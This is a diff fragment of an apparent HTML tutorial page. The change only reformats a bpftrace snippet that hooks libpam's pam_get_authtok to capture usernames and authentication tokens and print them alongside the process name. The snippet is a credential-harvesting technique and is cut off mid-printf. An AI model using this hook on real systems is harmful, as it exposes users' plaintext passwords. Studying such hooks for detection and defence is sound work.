@@ -158,12 +158,15 @@
 }
 </code></pre><h2 id="hooking-the-pam_get_authtok-function">Hooking the pam_get_authtok function</h2>
 <p>Now we create the core of the bpftrace program by hooking the <code>pam_getauthtok</code> call, reading the username and the password into a variable and printing them out once the function returns.</p>
-<pre><code>uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok {
+<pre><code>uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok 
+{
       @user[tid] = ((struct partial_pam_handle *)arg0)-&gt;user;
       @authtok[tid] =  arg2;
 }
     
-uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok /@user[tid]/ {
+uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok 
+/@user[tid]/ 
+{
   
       printf(&quot;Program: %s, Username: %s, AuthTok: %s\n&quot;, 
              comm, //process
